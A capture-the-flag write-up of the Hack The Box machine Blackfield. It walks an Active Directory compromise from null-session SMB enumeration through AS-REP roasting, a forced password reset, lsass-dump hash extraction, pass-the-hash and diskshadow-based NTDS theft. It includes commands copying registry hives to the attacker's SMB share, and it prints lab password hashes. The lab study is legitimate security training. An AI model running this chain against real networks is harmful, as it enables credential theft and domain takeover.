---
title: 'blackfield.htb'
date: 2023-03-24
description: "Writeup for Blackfield, fourth box in HTB's Active Directory track."
---

# Introductions

Blackfield is a HTB box that is fourth in HTB's &ldquo;Active Directory 101&rdquo; track. I'm currently working on improving my Windows/AD hacking skills, so I'm working through this track to get a decent foundation before taking Zero Point's Red Team Operations 1 course.

# Enumeration

An initial portscan reveals typical ports for a Windows Domain Controller, if maybe a little sparse. It looks like the attack surface here is going to be fairly limited so I'll want to exhaust as many avenues for information gathering as possible. I guess I'd want to do that regardless, but that's what seeing these ports makes me feel.

```text
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-03-20 22:46:00Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

A `dig any blackfield.local @10.10.10.192` gets me all of the DNS entries that the domain controller wants to reveal to me. In doing so, I'm able to see two subdomains that the DNS server can resolve, `dc01` and `hostmaster`. It also is resolving to an IPv6 address, which is something I'll want to test out since IPv6 can often be misconfigured and insecure as a result.

```text
; <<>> DiG 9.18.12-1-Debian <<>> any blackfield.local @10.10.10.192
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27791
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;blackfield.local.              IN      ANY

;; ANSWER SECTION:
blackfield.local.       600     IN      A       10.10.10.192
blackfield.local.       3600    IN      NS      dc01.blackfield.local.
blackfield.local.       3600    IN      SOA     dc01.blackfield.local. hostmaster.blackfield.local. 166 900 600 86400 3600
blackfield.local.       600     IN      AAAA    dead:beef::8167:95b:23e1:8427

;; ADDITIONAL SECTION:
dc01.blackfield.local.  1200    IN      A       10.10.10.192
dc01.blackfield.local.  1200    IN      AAAA    dead:beef::8167:95b:23e1:8427

;; Query time: 19 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (TCP)
;; WHEN: Mon Mar 20 11:15:05 CDT 2023
;; MSG SIZE  rcvd: 199
```

An ldapsearch reveals some additional subdomains as well. I've snipped out most of the unnecessary output. The relevant lines here are the &ldquo;namingContexts&rdquo; which show subdomains of `DomainDnsZones` and `ForestDnsZones`.

```text
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=BLACKFIELD,DC=local
ldapServiceName: BLACKFIELD.local:dc01$@BLACKFIELD.LOCAL
 cal

<--!Snipped-->

serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=BLACKFIELD,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=BLACKFIELD,DC=local
namingContexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingContexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingContexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
isSynchronized: TRUE
highestCommittedUSN: 229496
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
dnsHostName: DC01.BLACKFIELD.local
defaultNamingContext: DC=BLACKFIELD,DC=local
currentTime: 20230321004149.0Z
configurationNamingContext: CN=Configuration,DC=BLACKFIELD,DC=local

# search result
search: 2
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=lo
result: 0 Success

# numResponses: 2
# numEntries: 1
```

I perform additional `dig` queries but cannot find more information. Both of those subdomains resolve to the same `10.10.10.192` IP address, and have no additional DNS entries associated with them. `ldapsearch` is equally fruitless.

I run `smbmap -H 10.10.10.192 -smb2support -u null` and notice that I have `READ ONLY` access to the `profiles$` share as the `null` user.

```text
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles$                                         	READ ONLY
	SYSVOL                                            	NO ACCESS	Logon server share
```

Listing out the directories in `profiles$` shows a very long list of usernames in the following format below:

```text
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABekesz
```

With `awk '{print $8}'` I seperate out the directory name column into a list of usernames. I run `impacket-GetNPUsers` to determine if any of the users in that list as vulnerable to ASREPRoasting, which one is; `support`. For some reason, I wasn't able to consistently get the user's hash when running the command with input from a file containing the list of usernames, so I had to use a bash loop to run the command for each individual username.

```text
for user in `cat loot/usernames.txt`;do impacket-GetNPUsers -dc-ip 10.10.10.192 -no-pass blackfield.local/$user | grep krb5 >> loot/gnpusers-individual.txt;done

cat loot/gnpusers-individual.txt

$krb5asrep$23$support@BLACKFIELD.LOCAL:dcb745b9d0e547a226bc8c47b0b0b996$5a0ef4b375e441bfc14b762bfa8df3fc766bc2df43f98c2d705cf191cd4ae10580f4d691c602a74f1d96aa6d4a2d3c9cbfa1d13a1959934727fd93ca6a5be5fec7a03c822a815bbd8dd540e0971b82fc221fffa51fc3f696c113abd48916e314f2dd7c465b28e77bfc1fcf671146cfdbed2fe2d24b63283e0ed7dae6480f2ec4deb1717a36cee37fd59916db796123ff3832bbf0597526caf5721e3e0a2ee8636aeb4832fd74c96ca9e4c5b4e0c0738b396bf0faf032023d29896c7bef3f3f06785a9b15ba152bc8b19ef0171ce2fe9dcbb4e98cd44789097be9d39d5cfbed3e0b0444317af7378a3d732d5c1bd713ae2cc054cc
```

I use `hashcat` and the `rockyou.txt` wordlist to recover the password `#00<sup>BlackKnight</sup>` for the user `support`.

# Initial Access as `support`

With access as `support`, I list the available SMB shares again and now have `READ ONLY` to `NETLOGON`, and `SYSVOL`. A recursive directory listing of NETLOGON shows that it's empty, while SYSVOL contains the following:

```text
	dr--r--r--                0 Mon Mar 20 17:42:09 2023	DfsrPrivate
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	Policies
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	scripts
	.\SYSVOL\BLACKFIELD.local\Policies\*
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	.
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	..
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\SYSVOL\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	.
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	..
	fr--r--r--               22 Sun Feb 23 05:20:36 2020	GPT.INI
	dr--r--r--                0 Sun Feb 23 05:20:36 2020	MACHINE
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	USER
	.\SYSVOL\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sun Feb 23 05:20:36 2020	.
	dr--r--r--                0 Sun Feb 23 05:20:36 2020	..
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	Microsoft
	fr--r--r--             2796 Sun Feb 23 05:20:36 2020	Registry.pol
	.\SYSVOL\BLACKFIELD.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	.
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	..
	dr--r--r--                0 Sun Feb 23 05:13:21 2020	Windows NT
	.\SYSVOL\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	.
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	..
	fr--r--r--               22 Sun Feb 23 09:31:03 2020	GPT.INI
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	MACHINE
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	USER
	.\SYSVOL\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	.
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	..
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	Microsoft
	.\SYSVOL\BLACKFIELD.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	.
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	..
	dr--r--r--                0 Sun Feb 23 09:31:03 2020	Windows NT
```

Unfortunately, I don't know of any use these files could have at the moment. I also check for command execution via SMB, WMI, etc. And enumerating LDAP as the user `support` yields nothing new as well.

To list out all potential avenues that this user has opened for me, I attempt to enumerate its privileges with `BloodHound.py`, a remote ingestor for bloodhound. I run it with the `-c ALL` flag to enumerate as much information as possible from the domain.

After searching for the user `support` in bloodhound, I find that the user has a single permission over another user. It has the `ForceChangePassword` capability against the user `audit2020`.

![Image of bloodhound graph showing 'ForceChangePassword' against audit2020](../../../assets/writeups/htb_blackfield/graph.png)

Initial research into this capability teaches me that the normal way to abuse this permission is through the Windows command line. I would need to utilize the `net.exe` binary or PowerView's `Set-DomainUserPassword` function. As I have no access to a domain-joined host, these options aren't available to me. I found a [mubix blog post](https://room362.com/post/2017/reset-ad-user-password-with-linux/) that describes how to do this remotely through the RPC protocol.

```text
ctf-htb-blackfield/loot [ main][?]
❯ rpcclient -U support //10.10.10.192
Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 audit2020 23 'Password123'
rpcclient $> exit
```

With this, I've changed the user `audit2020`'s password.

# Initial Access as `audit2020`

I confirm access as `audit2020` by listing SMB shares as that user, and I find that I now have read access to the `forensic` share.

```text
BloodHound.py [ master][🐍 v3.11.2]
❯ smbmap -u audit2020 -p 'Password123' -H 10.10.10.192
[+] IP: 10.10.10.192:445        Name: blackfield.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

A recursive directory listing of the `forensic` share shows a variety of forensics tools and command outputs. I download the command outputs directory and look through them:

```text
        fr--r--r--              528 Sun Feb 23 12:12:54 2020    domain_admins.txt
        fr--r--r--              962 Sun Feb 23 12:12:54 2020    domain_groups.txt
        fr--r--r--            16454 Fri Feb 28 16:32:17 2020    domain_users.txt
        fr--r--r--           518202 Sun Feb 23 12:12:54 2020    firewall_rules.txt
        fr--r--r--             1782 Sun Feb 23 12:12:54 2020    ipconfig.txt
        fr--r--r--             3842 Sun Feb 23 12:12:54 2020    netstat.txt
        fr--r--r--             3976 Sun Feb 23 12:12:54 2020    route.txt
        fr--r--r--             4550 Sun Feb 23 12:12:54 2020    systeminfo.txt
        fr--r--r--             9990 Sun Feb 23 12:12:54 2020    tasklist.txt
```

There's also a directory of .zip files called `memory-analysis`, and I download those too. In particular, there's a .zip called `lsass.zip` that immediately catches my attention.

```text
fr--r--r--         37876530 Thu May 28 15:29:24 2020    conhost.zip
fr--r--r--         24962333 Thu May 28 15:29:24 2020    ctfmon.zip
fr--r--r--         23993305 Thu May 28 15:29:24 2020    dfsrs.zip
fr--r--r--         18366396 Thu May 28 15:29:24 2020    dllhost.zip
fr--r--r--          8810157 Thu May 28 15:29:24 2020    ismserv.zip
fr--r--r--         41936098 Thu May 28 15:29:24 2020    lsass.zip
fr--r--r--         64288607 Thu May 28 15:29:24 2020    mmc.zip
fr--r--r--         13332174 Thu May 28 15:29:24 2020    RuntimeBroker.zip
fr--r--r--        131983313 Thu May 28 15:29:24 2020    ServerManager.zip
fr--r--r--         33141744 Thu May 28 15:29:24 2020    sihost.zip
fr--r--r--         33756344 Thu May 28 15:29:24 2020    smartscreen.zip
fr--r--r--         14408833 Thu May 28 15:29:24 2020    svchost.zip
fr--r--r--         34631412 Thu May 28 15:29:24 2020    taskhostw.zip
fr--r--r--         14255089 Thu May 28 15:29:24 2020    winlogon.zip
fr--r--r--          4067425 Thu May 28 15:29:24 2020    wlms.zip
fr--r--r--         18303252 Thu May 28 15:29:24 2020    WmiPrvSE.zip
```

I process the `lsass.dmp` file contained in the zip using `pypykatz` which gives me the NT hash for the user `svc-backup`.

```text
== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
```

# Initial Access as `svc-backup`

I'm able to authenticate over WinRM by passing `svc-backup`'s NT hash.

```text
❯ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

I grab the user hash from `C:\Users\svc-backup\desktop\user.txt` then move onto enumerating for privilege escalation opportunities. A `whoami /all` reveals the `SeBackupPrivilege` which gives this user read access to all files on the system as long as the `FILE-FLAG-BACKUP-SEMANTICS` flag is set on the file copying function that we use. So, we need to utilize a script that does that to utilize the read only capability.

Having loaded in and imported the SeBackupPrivilege DLLs, I can use `Copy-FileSeBackupPrivilege` to copy over the `root.txt` hash. That's not very fun, however, and I want to fully compromise this machine and become Administrator.

There's a `note.txt` file in the Administrator's desktop, so I copy that over and read it.

```text
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

I can't simply copy the ntds.dit file since it is constantly in use by the active directory database. So first, I need to create a &ldquo;Shadow copy&rdquo; of the filesystem using the `diskshadow.exe` utility that is conveniently already installed on the system.

The evil-winrm &ldquo;shell&rdquo; isn't sufficient for the interactive diskshadow binary. I do some googling and find ConPtyShell. I use Method 2, which took some troubleshooting that led me to realize that `tmux` was messing up my shell.

So I catch the shell in a non-tmux session.

I follow the instructions specified at <https://pentestlab.blog/tag/diskshadow/>, except for one additional command that i needed to run since the directory I was in was read-only.

```text
PS C:\Users\svc_backup\desktop> diskshadow
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  3/21/2023 6:14:03 PM


DISKSHADOW> set context persistent nowriters'

SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }

        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
        PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
        VOLATILE                Specify that shadow copy will be deleted on exit or reset.
        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.

        Example: SET CONTEXT CLIENTACCESSIBLE

DISKSHADOW> set context persistent nowriters

DISKSHADOW> add volume c: alias AliasName

DISKSHADOW> set metadata C:\Users\svc_backup\desktop\metadata.cab
The metadata file name path specifies a directory that is read-only.

DISKSHADOW> set metadata C:\Users\public\desktop\metadata.cab
The metadata file name path specifies a directory that is read-only.

DISKSHADOW> set metadata C:\Users\public\
No filename was specified.

DISKSHADOW> set metadata C:\Users\public\metadata.cab
The metadata file name path specifies a directory that is read-only.

DISKSHADOW> set metadata C:\Users\svc_backup\metadata.cab

DISKSHADOW> create
Alias AliasName for shadow ID {c3ad8620-8b3a-4bc6-944c-f732eb0ea317} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {00fe2ddc-208a-45d0-9b02-cdad7df538b8} set as environment variable.

Querying all shadow copies with the shadow copy set ID {00fe2ddc-208a-45d0-9b02-cdad7df538b8}

        * Shadow copy ID = {c3ad8620-8b3a-4bc6-944c-f732eb0ea317}               %AliasName%
                - Shadow copy set: {00fe2ddc-208a-45d0-9b02-cdad7df538b8}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 3/21/2023 6:15:41 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1

DISKSHADOW> expose %AliasName% z:
-> %AliasName% = {c3ad8620-8b3a-4bc6-944c-f732eb0ea317}
The shadow copy was successfully exposed as z:\.

DISKSHADOW> exit
```

Then, I use the following commands to exfiltrate everything I need to my kali machine:

```text
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system system.sav
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\sam sam.sav
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/21/2023   6:20 PM          45056 sam.sav
-a----        3/21/2023   6:20 PM       17580032 system.sav


*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy .\sam.sav \\10.10.14.3\oriel\sam.sav
*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy .\system.sav \\10.10.14.3\oriel\system.sav
```

I use `impacket-secretsdump -sam sam.sav -system system.sav -ntds ntds.dit -hashes lmhash:nthash LOCAL` to dump all local hashes from `ntds.dit`, which gets me the following Administrator account hash:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

# Administrator Access

I can use that hash to authenticate via WinRM, just like I previously did with `svc-backup`.

```text
ctf-htb-blackfield/loot [ main][?][⏱ 43s]
❯ evil-winrm -u administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```